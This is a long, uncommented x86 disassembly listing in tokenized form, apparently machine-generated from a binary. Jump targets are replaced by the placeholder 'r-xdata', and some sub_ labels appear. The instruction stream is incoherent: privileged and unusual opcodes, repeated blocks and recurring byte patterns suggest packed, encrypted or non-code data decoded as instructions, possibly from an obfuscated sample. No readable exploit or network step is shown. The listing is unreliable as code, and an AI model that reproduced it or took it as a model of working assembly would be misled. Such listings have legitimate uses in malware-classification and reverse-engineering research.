jmp r-xdata
jpo r-xdata
imul [ esi ]
pushad
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
js r-xdata
sbb eax 0x1d793cf0
test bl ch
cmp esi [ ebx - 0x6e ]
jmp r-xdata
adc [ 0xfffffffff21db3f0 ] edx
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
adc eax 0xf21db3f0
je r-xdata
jpo r-xdata
push ebx
sub_479cd2
push cs
ja r-xdata
jns r-xdata
in eax 0x81
test [ eax + edi * 8 - 0x44018841 ] al
je r-xdata
jpo r-xdata
jpo r-xdata
push edx
jmp r-xdata
add [ esp + eax * 4 - 0x7b65656e ] 0xebebeb84
[ ss : esi ] [ edi ]
dec eax
mov ebx 0x7b7c9c92
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jpo r-xdata
clc
mov edi 0x74bbfe77
add dh [ ecx + 0x7b ]
jpo r-xdata
sub eax 0xf8a3f043
add [ esp + esi * 2 + 0x7b6969fe ] 0x7b
dec eax
lea ebp [ 0xffffffff92372c84 ]
sub al 0x4a
jpo r-xdata
ja r-xdata
xchg ebx eax
scasb [ edi ]
test [ esi ] cl
jae r-xdata
jmp r-xdata
push 0xffffff85
mov dl 0xb8
jmp r-xdata
mov ebx 0x81f2ff74
test [ edx + edx * 4 - 0x7b7b6566 ] al
jmp r-xdata
lodsb [ esi ]
test [ edx + 0x7b7a2892 ] al
jpo r-xdata
mov dl 0x92
int 0x9a
test [ ebx + ebp * 8 - 0x516c4310 ] al
and ah [ edx ]
xchg edx eax
push esp
push eax
jpo r-xdata
jmp r-xdata
xchg edx eax
arpl [ ebp + 0x7b ] si
jpo r-xdata
cmpsd [ esi ] [ edi ]
test bl ch
dec eax
mov ebx 0xb2202524
mov eax 0xebebebeb
sbb eax 0x229336f2
sub [ 0xfffffffff09136f2 ] ebx
add [ esp + eax * 4 - 0x7b65656e ] 0xebebeb84
add [ esp + eax * 4 - 0x1884008 ] 0xf2ff74bb
pop ebx
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov dl 0xb8
jmp r-xdata
mov bl 0x1d
xchg edi eax
and dl [ edx + 0x7b7b524e ]
jmp r-xdata
xchg ebx eax
and ch [ ecx ]
sbb eax 0xf09136f2
int1
outsd
inc ecx
xchg ebx eax
lds ebx [ eax - 0x9d47b7c ]
test [ ebx ] ch
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 - 0x60f36dd5 ] al
xchg edx eax
cwde
outsd
jpo r-xdata
push eax
mov dl [ edx + 0x7b7b618e ]
and bh dh
mov ebx 0x84994992
test bl ch
jpo r-xdata
je r-xdata
jle r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0xde2f7ef ] al
cdq
and edx [ ecx ]
pop ecx
xchg edx eax
out 0x62 al
jpo r-xdata
or al 0x9f
je r-xdata
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
js r-xdata
js r-xdata
mov ch 0x55
jpo r-xdata
jo r-xdata
and al 0x25
mov eax 0xa792ebeb
mov ah 0x71
jpo r-xdata
jpo r-xdata
imul ebp [ ecx + 0x7b ] 0x92bb487b
pushfd
jl r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub ebp [ edx + esi * 8 ]
jmp r-xdata
clc
mov ebx 0xb4922b73
jno r-xdata
xchg edi eax
dec ebx
adc [ ecx ] ebx
xchg edx eax
lds ebx [ ebx - 0x14147b7c ]
sbb eax 0xff748dfe
cmc
jne r-xdata
jmp r-xdata
dec ebx
imul edi [ ebx ] 0x35
jmp r-xdata
jpo r-xdata
jpo r-xdata
push eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
clc
jpo r-xdata
pop eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
cmp esi [ 0x747efe74 ]
test [ esp + eax * 4 - 0x7b7ac56e ] eax
test bl ch
jmp r-xdata
je r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
jpo r-xdata
r-xdata
test ah cl
mov edi 0x937b7b7b
0x7b61
jpo r-xdata
clc
pop ds
pop edi
pop edi
jpo r-xdata
jg r-xdata
int3
jmp r-xdata
pop ebp
pop esi
jpo r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
[ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
jmp r-xdata
iretd
aas
pop edi
pop edi
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
je r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
xchg ecx eax
push esp
jpo r-xdata
jg r-xdata
jpo r-xdata
pop edi
pop ebx
xchg edx eax
ja r-xdata
jpo r-xdata
lahf
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xor edx 0x2e
xchg edx esi
std
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
jpo r-xdata
imul [ esi ]
pushad
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
js r-xdata
sbb eax 0x1d793cf0
cmp esi [ ebx - 0x6e ]
jmp r-xdata
adc [ 0xfffffffff21db3f0 ] edx
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
adc eax 0xf21db3f0
je r-xdata
jpo r-xdata
push ebx
sub_479d2f
test bl ch
out 0x7b eax
jpo r-xdata
add [ esp + eax * 4 + 0x6ff1ebeb ] 0x3b6b4b41
xor eax 0x747efe74
xchg edx eax
ficomp [ ebx + 0x7b ]
jpo r-xdata
mov ch 0x55
jpo r-xdata
and al 0x25
mov eax 0xa792ebeb
jmp r-xdata
lds ebx [ eax - 0x9d47b7c ]
test [ ebx ] ch
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 - 0x60f36dd5 ] al
jmp r-xdata
clc
mov ebx 0xb4922b73
jno r-xdata
mov ah 0x71
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
clc
jpo r-xdata
xchg edi eax
dec ebx
adc [ ecx ] ebx
xchg edx eax
lds ebx [ ebx - 0x14147b7c ]
sbb eax 0xff748dfe
cmc
jne r-xdata
jmp r-xdata
dec ebx
imul edi [ ebx ] 0x35
jmp r-xdata
mov esp 0x84acae93
test [ edx ] ah
xchg edx eax
sub [ edx + 0x7b ] bh
jmp r-xdata
jo r-xdata
xchg edx eax
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0xde2f7ef ] al
cdq
and edx [ ecx ]
pop ecx
xchg edx eax
out 0x62 al
jpo r-xdata
or al 0x9f
jpo r-xdata
r-xdata
pop eax
jpo r-xdata
jpo r-xdata
js r-xdata
test ah cl
mov edi 0x937b7b7b
0x7b61
jmp r-xdata
je r-xdata
jle r-xdata
jpo r-xdata
cmp esi [ 0x747efe74 ]
jpo r-xdata
mov dl 0x92
int 0x9a
test [ ebx + ebp * 8 - 0x516c4310 ] al
and ah [ edx ]
jpo r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
jpo r-xdata
clc
pop ds
pop edi
pop edi
jpo r-xdata
jg r-xdata
int3
sub ebp [ edx + esi * 8 ]
jpo r-xdata
pop ebx
jpo r-xdata
jmp r-xdata
fstp [ ebx + 0x7b ]
jpo r-xdata
jmp r-xdata
xchg ecx eax
push esp
jpo r-xdata
jg r-xdata
[ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
jmp r-xdata
iretd
aas
pop edi
pop edi
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
je r-xdata
jmp r-xdata
jpo r-xdata
js r-xdata
int1
outsd
inc ecx
xchg ebx eax
lodsb [ esi ]
test [ edx + 0x7b7a2892 ] al
xchg ebx eax
scasb [ edi ]
jmp r-xdata
test [ ebp + 0x7b ] ebp
jpo r-xdata
lahf
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
pop edi
pop ebx
xchg edx eax
ja r-xdata
jpo r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
imul [ esi ]
pushad
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xor edx 0x2e
xchg edx esi
std
jmp r-xdata
jmp r-xdata
push eax
jpo r-xdata
mov edi 0xf6af3ef3
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
lahf
jmp r-xdata
xchg edx eax
push esp
push eax
jpo r-xdata
adc [ 0xfffffffff21db3f0 ] edx
cmp eax 0xeb84848e
cmp esi [ ebx - 0x6e ]
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
js r-xdata
sbb eax 0x1d793cf0
jae r-xdata
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
lahf
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
adc eax 0xf21db3f0
je r-xdata
jpo r-xdata
pop esp
jmp r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jpo r-xdata
push ebx
mov dl 0xb8
jmp r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
test bl ch
jmp r-xdata
sub_479d68
jmp r-xdata
test [ esp + eax * 4 - 0x7b7ac56e ] eax
test bl ch
jmp r-xdata
jmp r-xdata
jmp r-xdata
lahf
jmp r-xdata
jmp r-xdata
xchg edx eax
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0xde2f7ef ] al
cdq
and edx [ ecx ]
pop ecx
xchg edx eax
out 0x62 al
jpo r-xdata
or al 0x9f
mov ah 0x71
jpo r-xdata
jpo r-xdata
xchg edi eax
dec ebx
adc [ ecx ] ebx
xchg edx eax
lds ebx [ ebx - 0x14147b7c ]
sbb eax 0xff748dfe
cmc
jne r-xdata
jmp r-xdata
dec ebx
imul edi [ ebx ] 0x35
jmp r-xdata
pop eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
je r-xdata
jle r-xdata
cmp esi [ 0x747efe74 ]
jpo r-xdata
clc
pop ds
pop edi
pop edi
jpo r-xdata
jg r-xdata
int3
jpo r-xdata
jpo r-xdata
mov ch 0x55
jpo r-xdata
jo r-xdata
and al 0x25
mov eax 0xa792ebeb
[ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
jmp r-xdata
iretd
aas
pop edi
pop edi
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
je r-xdata
js r-xdata
js r-xdata
jmp r-xdata
clc
mov ebx 0xb4922b73
jno r-xdata
jpo r-xdata
pop edi
pop ebx
xchg edx eax
ja r-xdata
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub ebp [ edx + esi * 8 ]
jpo r-xdata
clc
jpo r-xdata
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xor edx 0x2e
xchg edx esi
std
jmp r-xdata
push eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
r-xdata
test ah cl
mov edi 0x937b7b7b
0x7b61
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
js r-xdata
sbb eax 0x1d793cf0
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
jmp r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
xchg ecx eax
push esp
jpo r-xdata
jg r-xdata
mov dl 0xb8
jmp r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jpo r-xdata
imul [ esi ]
pushad
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
adc [ 0xfffffffff21db3f0 ] edx
cmp esi [ ebx - 0x6e ]
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
test bl ch
jmp r-xdata
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
adc eax 0xf21db3f0
je r-xdata
jpo r-xdata
push ebx
sub_479d69
adc edi [ ebx + 0x6b ]
jpo r-xdata
xchg edx eax
xchg edx eax
retn
jpo r-xdata
push eax
mov bh al
mov edx 0x723c9279
jpo r-xdata
xchg edx eax
mov [ ebp - 0x14147b7c ] ebp
jmp r-xdata
jpo r-xdata
pop esp
jmp r-xdata
jmp r-xdata
push 0xffffff85
sub eax 0xeb7b7b5c
test [ 0x773ef013 ] ch
xchg edx eax
jmp r-xdata
les ebx [ edx + 0x7b ]
jpo r-xdata
test bl ch
jae r-xdata
mov dl 0xb8
jmp r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jmp r-xdata
jpo r-xdata
xchg edx eax
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
sub_479d70
scasd [ edi ]
test [ ebx + ebp * 8 + 0x2922ceb ] al
jno r-xdata
xchg edx eax
jpo r-xdata
jpo r-xdata
push eax
mov bh al
mov edx 0x723c9279
jpo r-xdata
jmp r-xdata
push 0xffffff85
xchg edx eax
mov [ ebp - 0x14147b7c ] ebp
jmp r-xdata
jpo r-xdata
pop esp
jmp r-xdata
cmpsd [ esi ] [ edi ]
xchg edx eax
arpl [ ebp + 0x7b ] si
jpo r-xdata
test bl ch
jmp r-xdata
sub eax 0xeb7b7b5c
test [ 0x773ef013 ] ch
jmp r-xdata
add dh [ ecx + 0x7b ]
mov dl 0xb8
jmp r-xdata
les ebx [ edx + 0x7b ]
jpo r-xdata
jae r-xdata
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
sub_479d97
fcom [ eax - 0x636d7b7c ]
imul edi [ ebx + 0x7b ] 0xb8b22025
jpo r-xdata
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
test bl ch
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
mov dl 0xb8
jmp r-xdata
sub_479dd5
xchg edx eax
push edi
xchg [ esp + eax * 4 - 0x14141415 ] al
adc [ edx + esi * 8 - 0x127b78fa ] eax
idiv [ ebx + 0x7b ]
push 0xffffff85
sub eax 0xeb7b7b5c
test [ 0x773ef013 ] ch
xchg edx eax
test bl ch
jpo r-xdata
push eax
mov bh al
mov edx 0x723c9279
jpo r-xdata
mov dl 0xb8
jmp r-xdata
xchg edx eax
mov [ ebp - 0x14147b7c ] ebp
jmp r-xdata
jpo r-xdata
pop esp
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
les ebx [ edx + 0x7b ]
jpo r-xdata
jae r-xdata
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jmp r-xdata
jmp r-xdata
xchg edx eax
sub_479e13
mov bh 0x92
push ax
jpo r-xdata
jmp r-xdata
jmp r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
xchg edx eax
cmp esi [ ebx - 0x6e ]
jmp r-xdata
sub_479e1c
test [ edi ] bh
pop edi
outsd
xchg edx eax
js r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
push eax
jpo r-xdata
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jpo r-xdata
jae r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
pop esp
cmp eax 0xeb84848e
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
test bl ch
xchg edx eax
cmp esi [ ebx - 0x6e ]
jmp r-xdata
sub_479e2e
sub [ 0x7b549192 ] ch
jpo r-xdata
js r-xdata
js r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub ebp [ edx + esi * 8 ]
jmp r-xdata
push eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
push ebx
jmp r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
mov dl 0xb8
jmp r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
jpo r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
test bl ch
cmp esi [ ebx - 0x6e ]
jmp r-xdata
sub_479e57
mov edi 0x92bbfe63
dec eax
test [ esp + eax * 4 - 0x6d141415 ] eax
jmp r-xdata
les ebx [ edx + 0x7b ]
jpo r-xdata
jpo r-xdata
push eax
mov bh al
mov edx 0x723c9279
jpo r-xdata
mov [ ebp - 0x14147b7c ] ebp
jmp r-xdata
xchg edx eax
jpo r-xdata
pop esp
jmp r-xdata
push 0xffffff85
sub eax 0xeb7b7b5c
test [ 0x773ef013 ] ch
xchg edx eax
jmp r-xdata
test bl ch
jae r-xdata
mov dl 0xb8
jmp r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jmp r-xdata
jpo r-xdata
xchg edx eax
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
sub_479e6c
xchg edi eax
sub ebp [ edx + esi * 8 ]
jmp r-xdata
jpo r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
push ebx
pop esp
jmp r-xdata
jae r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
sub_479e84
cmp eax 0x3ef22b2b
adc [ edx + 0x7b7b5c67 ] 0xffffffeb
jmp r-xdata
je r-xdata
push ebx
pop esp
jpo r-xdata
pop esp
jmp r-xdata
jae r-xdata
cmp eax 0xeb84848e
jmp r-xdata
xchg edx eax
sub_479e98
arpl [ gs : ebx + 0x7b ] di
adc [ edi - 0x6e ] edi
jg r-xdata
jmp r-xdata
jpo r-xdata
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
int3
cmp esi [ ebx - 0x6e ]
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
cmp eax 0xeb84848e
jmp r-xdata
xchg edx eax
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
adc eax 0xf21db3f0
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
je r-xdata
jpo r-xdata
push ebx
pop esp
jpo r-xdata
pop esp
jmp r-xdata
jae r-xdata
sub_479f04
sbb eax 0xf0c906f2
adc [ ecx ] 0x7e119203
jpo r-xdata
jmp r-xdata
jmp r-xdata
xor edx 0x2e
jmp r-xdata
jae r-xdata
pop esp
jpo r-xdata
cmp eax 0xeb84848e
jmp r-xdata
xchg edx eax
sub_479fe8
sub edx [ ebx + 0x7b7b5149 ]
xchg edx eax
fwait
push 0x74eb7b7b
jmp r-xdata
dec eax
test [ eax ] ch
cmp al 0x84
jmp r-xdata
xchg ebx eax
jpo r-xdata
sbb [ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
test dh dh
sub [ ebx ] 0x11
xchg edx eax
dec edi
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
mov ebx 0x7b53a792
jpo r-xdata
ja r-xdata
test bl ch
jmp r-xdata
jmp sub_47a065
test [ ebx + ebp * 8 - 0x586dc415 ] al
mov [ esp + eax * 4 + 0x48ebebeb ] es
sub al 0xf0
cmp eax 0x15925681
jns r-xdata
jpo r-xdata
dec eax
mov ebx 0x5ec39222
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg ebx eax
adc [ ecx - 0x1097b7c ] al
mov bl 0x86
test [ ebx + ebp - 0x7b79b56e ] al
mov ebp 0x7b532492
jpo r-xdata
jpo r-xdata
push [ ecx + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in eax dx
sub [ esp + eax * 4 ] bh
jpo r-xdata
xchg edx eax
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
out dx eax
add [ esp + eax * 4 - 0x6ddd44b8 ] 0xc3
pop esi
xchg edx eax
jmp r-xdata
xlat
jpo r-xdata
sub_47a065
jmp r-xdata
push es
mov ecx 0xc39285f0
jpo r-xdata
xchg [ ebx ] ebp
xchg edx eax
or [ edi + 0x7b ] ebx
jpo r-xdata
jpo r-xdata
xchg ecx eax
test bl ch
jmp r-xdata
insb
jpo r-xdata
test [ ebx + ebp - 0x54310dd8 ] al
mov [ esp + eax * 4 + 0x48ebebeb ] al
test eax 0x7b62ef92
jpo r-xdata
clc
xchg ebx eax
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
jmp r-xdata
call [ eax ]
jle r-xdata
jns r-xdata
test [ edx + edx * 4 - 0x7b7b51d2 ] al
jmp r-xdata
mov ebx 0x91c0ff74
arpl si si
mov ebp [ ebx ]
idiv [ esi ]
shr [ ebx ] cl
jmp r-xdata
jpo r-xdata
bound edi [ ebx + 0x7b ]
je r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
adc [ ebx - 0x6e ] ebx
jns r-xdata
aas
cmp al [ ebp + 0x7b736692 ]
jpo r-xdata
adc [ esi + 0x7b ] bh
sub [ eax ] ch
sub esi esi
shr [ ebx ] cl
xchg edx eax
out dx eax
xchg edx eax
test [ ebx - 0x14147b7c ] 0xeb
jmp r-xdata
sub_47a093
lahf
sub [ ebx ] ch
xchg edx eax
mov dl 0x7e
jpo r-xdata
adc [ 0xffffffff84a7eb92 ] ebp
test dh dh
cmpsd [ ss : esi ] [ edi ]
jmp r-xdata
xchg ebx eax
adc [ ecx - 0x1097b7c ] al
mov bl 0x86
test [ ebx + ebp - 0x7b79b56e ] al
cmpsd [ esi ] [ edi ]
jpo r-xdata
test dh dh
sub [ ebx ] 0x11
xchg edx eax
dec edi
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
jmp sub_47a065
sub_47a0d0
sub al 0x11
jg r-xdata
jmp r-xdata
xchg [ ebx ] ebp
xchg edx eax
or [ edi + 0x7b ] ebx
jpo r-xdata
jmp r-xdata
xchg ecx eax
add edx [ edx - 0x7b7b7679 ]
sub ebp [ eax ]
sub [ edx + 0x7b7b6b7b ] dl
xchg edx eax
insb
jpo r-xdata
imul esp [ ecx - 0x14147b7c ] 0x3ef21deb
xchg ecx eax
and edx [ ecx ]
adc dl [ edx - 0x7b7b60e9 ]
jmp r-xdata
mov [ esp + eax * 4 + 0x48ebebeb ] al
test eax 0x7b62ef92
jpo r-xdata
clc
xchg ebx eax
jmp r-xdata
call [ eax ]
jle r-xdata
jns r-xdata
test [ edx + edx * 4 - 0x7b7b51d2 ] al
jmp r-xdata
mov ebx 0x91c0ff74
arpl si si
mov ebp [ ebx ]
idiv [ esi ]
shr [ ebx ] cl
jmp r-xdata
jpo r-xdata
bound edi [ ebx + 0x7b ]
je r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
adc [ ebx - 0x6e ] ebx
jns r-xdata
aas
cmp al [ ebp + 0x7b736692 ]
jpo r-xdata
adc [ esi + 0x7b ] bh
sub [ eax ] ch
sub esi esi
shr [ ebx ] cl
